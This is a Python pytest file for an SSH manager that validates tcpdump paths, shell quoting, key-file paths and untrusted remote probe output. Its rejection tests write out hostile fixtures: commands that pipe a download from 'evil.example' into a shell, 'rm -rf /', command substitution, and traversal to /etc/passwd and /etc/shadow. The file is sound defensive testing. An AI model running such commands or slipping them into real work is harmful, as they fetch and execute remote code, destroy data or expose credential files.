"""Tests for backend.ssh_manager's hostile-input surface: everything a
compromised or hostile remote host could answer with, and the injection
that must never reach a shell command."""

from __future__ import annotations

import pytest

from backend.ssh_manager import (
    SSHManager,
    _is_safe_tcpdump_path,
    _shell_quote,
    evaluate_prereqs,
    parse_prereq_output,
)


# --- _is_safe_tcpdump_path ----------------------------------------------------


@pytest.mark.parametrize(
    "hostile",
    [
        "/bin/sh -c curl|sh",           # injection: space + pipe
        "/bin/sh; rm -rf /",            # injection: semicolon
        "/usr/bin/tcpdump`whoami`",     # injection: backtick substitution
        "/usr/bin/tcpdump$(whoami)",    # injection: $() substitution
        "/usr/bin/tcpdump && curl evil.example/x | sh",
        "/usr/bin/../../../etc/passwd",  # traversal -- and wrong basename
        "tcpdump",                       # relative path, no leading slash
        "bin/tcpdump",                   # relative path
        "/usr/bin/nc",                   # absolute, but not tcpdump
        "/usr/bin/tcpdump.exe",          # basename is not literally "tcpdump"
        "",                               # empty
        "/" + "a" * 260,                 # longer than the 255-char bound
        "/usr/bin/tcp\x00dump",          # embedded NUL
    ],
)
def test_is_safe_tcpdump_path_rejects_hostile_input(hostile):
    assert _is_safe_tcpdump_path(hostile) is False


@pytest.mark.parametrize(
    "safe",
    [
        "/usr/sbin/tcpdump",
        "/sbin/tcpdump",
        "/usr/local/bin/tcpdump",
        "/opt/some-vendor/tcpdump",
    ],
)
def test_is_safe_tcpdump_path_accepts_plausible_paths(safe):
    assert _is_safe_tcpdump_path(safe) is True


def test_is_safe_tcpdump_path_traversal_that_still_ends_in_tcpdump():
    """PurePosixPath does not collapse '..' segments, so a path containing
    them is judged purely on its final component -- this documents that
    behavior rather than assuming a stronger guarantee that isn't there:
    the value is only ever used as a literal string in a remote shell
    command, never resolved against a local filesystem, so this is not a
    local traversal primitive."""
    assert _is_safe_tcpdump_path("/usr/bin/../sbin/tcpdump") is True


# --- _shell_quote --------------------------------------------------------------


def test_shell_quote_empty_string():
    assert _shell_quote("") == "''"


@pytest.mark.parametrize("safe", ["tcpdump", "/usr/sbin/tcpdump", "eth0", "cap_2024-01-01.pcap"])
def test_shell_quote_passes_through_safe_strings_unchanged(safe):
    assert _shell_quote(safe) == safe


@pytest.mark.parametrize(
    "hostile",
    [
        "; rm -rf /",
        "$(whoami)",
        "`whoami`",
        "a b",
        "a|b",
        "a&b",
        "a'b",
        "a\"b",
    ],
)
def test_shell_quote_wraps_and_neutralizes_special_characters(hostile):
    quoted = _shell_quote(hostile)
    assert quoted.startswith("'") and quoted.endswith("'")
    # no unescaped single quote inside the body -- every embedded ' must be
    # the '"'"' escape sequence, never a bare one that would close early
    body = quoted[1:-1]
    assert "'\"'\"'" in body or "'" not in hostile


def test_shell_quote_embedded_single_quote_cannot_break_out():
    quoted = _shell_quote("'; rm -rf / #")
    # the quoting must never produce an unescaped closing quote followed by
    # more of the attacker's payload outside of quotes
    assert quoted == "''\"'\"'; rm -rf / #'"


# --- _key_path traversal --------------------------------------------------------


@pytest.fixture()
def manager(tmp_path):
    keys_dir = tmp_path / "ssh-keys"
    keys_dir.mkdir()
    return SSHManager(keys_dir, db=None, data_dir=tmp_path)


def test_key_path_resolves_normal_filename(manager, tmp_path):
    path = manager._key_path("my-key")
    assert path == (tmp_path / "ssh-keys" / "my-key")


@pytest.mark.parametrize(
    "hostile",
    [
        "../../../etc/passwd",
        "../../etc/shadow",
        "..",
        "subdir/../../escape",
    ],
)
def test_key_path_rejects_traversal(manager, hostile):
    with pytest.raises(ValueError):
        manager._key_path(hostile)


def test_key_path_rejects_absolute_path_escaping_keys_dir(manager):
    with pytest.raises(ValueError):
        manager._key_path("/etc/passwd")


# --- parse_prereq_output: hostile/untrusted probe output ------------------------


def test_parse_prereq_output_incomplete_probe():
    facts = parse_prereq_output("garbage, no markers at all")
    assert facts["complete"] is False


def test_parse_prereq_output_complete_probe_happy_path():
    raw = "\n".join([
        "OSREL_BEGIN",
        'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"',
        "ID=debian",
        "OSREL_END",
        "UID=1000",
        "USERGROUPS=alice sudo docker",
        "PATHVAL=/usr/local/bin:/usr/bin:/bin",
        "ONPATH=/usr/bin/tcpdump",
        "FOUND=/usr/bin/tcpdump",
        "SUDO=/usr/bin/sudo",
        "SUDO_NOPASSWD=yes",
        "VERSION=tcpdump version 4.99.0",
        "CAPS=cap_net_raw,cap_net_admin=eip",
        "SELINUX=Disabled",
        "TMPWRITE=yes",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["complete"] is True
    assert facts["os_release"]["PRETTY_NAME"] == "Debian GNU/Linux 12 (bookworm)"
    assert facts["uid"] == 1000
    assert facts["groups"] == ["alice", "sudo", "docker"]
    assert facts["on_path"] == "/usr/bin/tcpdump"
    assert facts["tcpdump_path"] == "/usr/bin/tcpdump"
    assert facts["sudo_present"] is True
    assert facts["sudo_nopasswd"] is True
    assert facts["tmp_writable"] is True


def test_parse_prereq_output_rejects_command_injection_in_found_path():
    raw = "\n".join([
        "UID=0",
        "FOUND=/bin/sh -c curl evil.example|sh",
        "ONPATH=/bin/sh -c curl evil.example|sh",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["found_paths"] == []
    assert facts["on_path"] == ""
    assert facts["tcpdump_path"] == ""


def test_parse_prereq_output_rejects_substitution_and_traversal_paths():
    raw = "\n".join([
        "FOUND=/usr/bin/tcpdump`whoami`",
        "FOUND=/usr/bin/tcpdump$(id)",
        "FOUND=/usr/bin/../../etc/passwd",
        "FOUND=relative/tcpdump",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["found_paths"] == []


def test_parse_prereq_output_dedupes_found_paths():
    raw = "\n".join([
        "FOUND=/usr/sbin/tcpdump",
        "FOUND=/usr/sbin/tcpdump",
        "FOUND=/usr/bin/tcpdump",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["found_paths"] == ["/usr/sbin/tcpdump", "/usr/bin/tcpdump"]


def test_parse_prereq_output_strips_nonprintable_characters():
    raw = "\n".join([
        "UID=1000",
        "USERGROUPS=alice\x00 sudo\x1b[31m",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    for group in facts["groups"]:
        assert group.isprintable() or group == ""
        assert "\x00" not in group


def test_parse_prereq_output_bounds_absurdly_long_values():
    raw = "\n".join([
        "PATHVAL=" + "A" * 10_000,
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert len(facts["path_env"]) <= 400


def test_parse_prereq_output_bounds_group_list_length():
    raw = "\n".join([
        "USERGROUPS=" + " ".join(f"g{i}" for i in range(1000)),
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert len(facts["groups"]) <= 40


def test_parse_prereq_output_uid_must_be_digits():
    raw = "\n".join(["UID=not-a-number", "PROBE_COMPLETE"])
    facts = parse_prereq_output(raw)
    assert facts["uid"] is None


def test_parse_prereq_output_sudo_nopasswd_requires_exact_yes():
    for value in ("YES", "true", "1", "yes please", ""):
        raw = f"SUDO_NOPASSWD={value}\nPROBE_COMPLETE"
        assert parse_prereq_output(raw)["sudo_nopasswd"] is False
    assert parse_prereq_output("SUDO_NOPASSWD=yes\nPROBE_COMPLETE")["sudo_nopasswd"] is True


def test_parse_prereq_output_os_release_values_are_bounded_and_cleaned():
    raw = "\n".join([
        "OSREL_BEGIN",
        "PRETTY_NAME=" + "x" * 1000,
        "OSREL_END",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert len(facts["os_release"]["PRETTY_NAME"]) <= 80


def test_parse_prereq_output_tcpdump_path_prefers_on_path_over_found():
    raw = "\n".join([
        "ONPATH=/usr/bin/tcpdump",
        "FOUND=/usr/sbin/tcpdump",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["tcpdump_path"] == "/usr/bin/tcpdump"


def test_parse_prereq_output_tcpdump_path_falls_back_to_found():
    raw = "\n".join([
        "FOUND=/usr/sbin/tcpdump",
        "PROBE_COMPLETE",
    ])
    facts = parse_prereq_output(raw)
    assert facts["tcpdump_path"] == "/usr/sbin/tcpdump"


# --- evaluate_prereqs: privilege matrix -----------------------------------------


def make_facts(**overrides) -> dict:
    facts = {
        "complete": True,
        "os_release": {"PRETTY_NAME": "Test Linux"},
        "found_paths": ["/usr/sbin/tcpdump"],
        "uid": 1000,
        "groups": [],
        "on_path": "/usr/sbin/tcpdump",
        "tcpdump_path": "/usr/sbin/tcpdump",
        "version": "tcpdump version 4.99.0",
        "caps": "",
        "caps_unavailable": False,
        "sudo_present": False,
        "sudo_nopasswd": False,
        "selinux": "",
        "tmp_writable": True,
        "path_env": "/usr/bin:/bin",
    }
    facts.update(overrides)
    return facts


def _check(checks: list[dict], name: str) -> dict:
    for c in checks:
        if c["name"] == name:
            return c
    raise AssertionError(f"no check named {name!r} in {[c['name'] for c in checks]}")


def test_evaluate_prereqs_incomplete_probe_short_circuits():
    checks = evaluate_prereqs(make_facts(complete=False), use_sudo=False)
    assert len(checks) == 1
    assert checks[0]["status"] == "fail"


def test_evaluate_prereqs_no_tcpdump_short_circuits():
    checks = evaluate_prereqs(make_facts(tcpdump_path="", on_path=""), use_sudo=False)
    assert _check(checks, "tcpdump installed")["status"] == "fail"
    assert not any(c["name"] == "Capture privilege" for c in checks)


def test_evaluate_prereqs_root_is_ok_regardless_of_sudo():
    checks = evaluate_prereqs(make_facts(uid=0), use_sudo=False)
    assert _check(checks, "Capture privilege")["status"] == "ok"


def test_evaluate_prereqs_cap_net_raw_is_ok_without_sudo():
    checks = evaluate_prereqs(
        make_facts(uid=1000, caps="cap_net_raw,cap_net_admin=eip"), use_sudo=False
    )
    assert _check(checks, "Capture privilege")["status"] == "ok"


def test_evaluate_prereqs_sudo_nopasswd_is_ok():
    checks = evaluate_prereqs(
        make_facts(uid=1000, sudo_present=True, sudo_nopasswd=True), use_sudo=True
    )
    assert _check(checks, "Capture privilege")["status"] == "ok"


def test_evaluate_prereqs_sudo_demands_password_fails():
    checks = evaluate_prereqs(
        make_facts(uid=1000, sudo_present=True, sudo_nopasswd=False, groups=["sudo"]),
        use_sudo=True,
    )
    check = _check(checks, "Capture privilege")
    assert check["status"] == "fail"
    assert "demanding a password" in check["detail"]
    assert "sudo" in check["detail"]


def test_evaluate_prereqs_sudo_requested_but_not_installed_fails():
    checks = evaluate_prereqs(
        make_facts(uid=1000, sudo_present=False), use_sudo=True
    )
    check = _check(checks, "Capture privilege")
    assert check["status"] == "fail"
    assert "not installed" in check["detail"]


def test_evaluate_prereqs_no_privilege_path_at_all_fails():
    checks = evaluate_prereqs(
        make_facts(uid=1000, caps="", sudo_present=False), use_sudo=False
    )
    check = _check(checks, "Capture privilege")
    assert check["status"] == "fail"
    assert "setcap" in check["fix"]


def test_evaluate_prereqs_caps_unavailable_warns_when_relevant():
    checks = evaluate_prereqs(
        make_facts(uid=1000, caps="", caps_unavailable=True, sudo_present=False), use_sudo=False
    )
    assert _check(checks, "Capability check")["status"] == "warn"


def test_evaluate_prereqs_caps_unavailable_not_shown_for_root():
    checks = evaluate_prereqs(
        make_facts(uid=0, caps_unavailable=True), use_sudo=False
    )
    assert not any(c["name"] == "Capability check" for c in checks)


def test_evaluate_prereqs_tmp_not_writable_fails():
    checks = evaluate_prereqs(make_facts(tmp_writable=False), use_sudo=False)
    assert _check(checks, "Temp space writable")["status"] == "fail"


def test_evaluate_prereqs_tmp_writable_unknown_produces_no_check():
    checks = evaluate_prereqs(make_facts(tmp_writable=None), use_sudo=False)
    assert not any(c["name"] == "Temp space writable" for c in checks)


@pytest.mark.parametrize("state,status", [("enforcing", "warn"), ("permissive", "ok"), ("disabled", "ok")])
def test_evaluate_prereqs_selinux_states(state, status):
    checks = evaluate_prereqs(make_facts(selinux=state), use_sudo=False)
    assert _check(checks, "SELinux")["status"] == status


def test_evaluate_prereqs_selinux_absent_produces_no_check():
    checks = evaluate_prereqs(make_facts(selinux=""), use_sudo=False)
    assert not any(c["name"] == "SELinux" for c in checks)


def test_evaluate_prereqs_on_path_warns_when_only_absolute():
    checks = evaluate_prereqs(make_facts(on_path=""), use_sudo=False)
    assert _check(checks, "tcpdump on the SSH PATH")["status"] == "warn"
